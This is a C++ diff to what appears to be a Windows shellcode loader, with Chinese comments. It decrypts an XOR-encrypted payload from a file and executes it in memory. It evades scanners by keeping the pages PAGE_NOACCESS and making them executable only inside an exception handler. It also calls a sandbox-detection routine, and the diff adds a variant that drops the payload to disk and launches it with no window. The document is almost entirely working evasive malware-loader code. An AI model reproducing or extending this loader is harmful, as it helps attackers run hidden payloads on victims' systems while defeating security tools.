@@ -7,6 +7,9 @@
 #include "detect.h"
 
 using namespace std;
+using ll = long long;
+
+ll shellcode_size = 0;
 
 bool readFile(const string& filename, vector<unsigned char>& key, vector<unsigned char>& encryptedData) {
     ifstream file(filename, ios::binary);
@@ -20,6 +23,17 @@ bool readFile(const string& filename, vector<unsigned char>& key, vector<unsigne
     encryptedData.assign((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
     return true;
 }
+
+void writeBinaryFile(const std::string& filename, const std::vector<unsigned char>& data) {
+    std::ofstream outFile(filename, std::ios::binary);
+    if (!outFile) {
+        std::cerr << "无法打开文件进行写入：" << filename << std::endl;
+        return;
+    }
+    outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
+    outFile.close();
+}
+
 
 
 
@@ -163,12 +177,14 @@ namespace ExceptionHandle {
             LPVOID faultingAddress = (LPVOID)pException->ExceptionRecord->ExceptionInformation[1]; // 访问的地址
             DWORD oldProtect;
 
-            if (getImportAddress::getVirtualProtect()(faultingAddress, 4096, PAGE_EXECUTE, &oldProtect)) {
+            if (getImportAddress::getVirtualProtect()(faultingAddress, shellcode_size, PAGE_EXECUTE, &oldProtect)) {
                 std::cout << "页面权限已修改为可执行！" << std::endl;
             }
         }
     }
 }
+
+
 
 int intruder() {
     char path[MAX_PATH];
@@ -181,22 +197,24 @@ int intruder() {
     }
     vector<unsigned char> decryptedData = xorDecrypt(encryptedData, key);
 
-    cout << "payload: ";
+    /*cout << "payload: ";
     for (unsigned char byte : decryptedData) {
         cout << hex <<std::setw(2)<<std::setfill('0')<< static_cast<int>(byte) << " ";
     }
-    cout << endl;
+    cout << endl;*/
     std::cout << "payload 开始执行:" << std::endl;
     int a;
     auto b = (void(*)())(getImportAddress::getVirtualAlloc()(NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
     memcpy(b, decryptedData.data(), decryptedData.size());
     DWORD oldProtect;
+    shellcode_size = decryptedData.size();
     (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
     (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));
     Sleep(5);
   
     //(getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
     detect_sandbox();
+
     __try {
         b();
     }
@@ -208,11 +226,64 @@ int intruder() {
     return 0;
 }
 
+// 这个没有用
+int intruderExe() {
+    char path[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, (LPWSTR)path);
+    std::cout << "当前工作目录: " << path << std::endl;
+    string filename = "payload.ini";
+    vector<unsigned char> key, encryptedData;
+    if (!readFile(filename, key, encryptedData)) {
+        return 1;
+    }
+    vector<unsigned char> decryptedData = xorDecrypt(encryptedData, key);
+    std::string outputFilename = "shellcode.bin";
+    writeBinaryFile(outputFilename, decryptedData);
+    /*cout << "payload: ";
+    for (unsigned char byte : decryptedData) {
+        cout << hex <<std::setw(2)<<std::setfill('0')<< static_cast<int>(byte) << " ";
+    }
+    cout << endl;*/
+    std::cout << "payload 开始执行:" << std::endl;
+    /*int a;
+    auto b = (void(*)())(getImportAddress::getVirtualAlloc()(NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    memcpy(b, decryptedData.data(), decryptedData.size());
+    DWORD oldProtect;
+    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
+    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));
+    Sleep(5);*/
+
+    //(getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
+    detect_sandbox();
+
+    /*__try {
+        b();
+    }
+    __except (ExceptionHandle::ExceptionHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
+        std::cout << "已将页面设置为可执行！" << std::endl;
+        b();
+    }
+    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));*/
+    
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    // 初始化 STARTUPINFO 结构体
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    // 初始化 PROCESS_INFORMATION 结构体
+    ZeroMemory(&pi, sizeof(pi));
+    CreateProcess((const WCHAR*)outputFilename.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    return 0;
+}
+
 
 
 int main()
 {
     detect_sandbox();
+    //intruder(); 
     intruder();
+    while (1);
     return 0;
 }
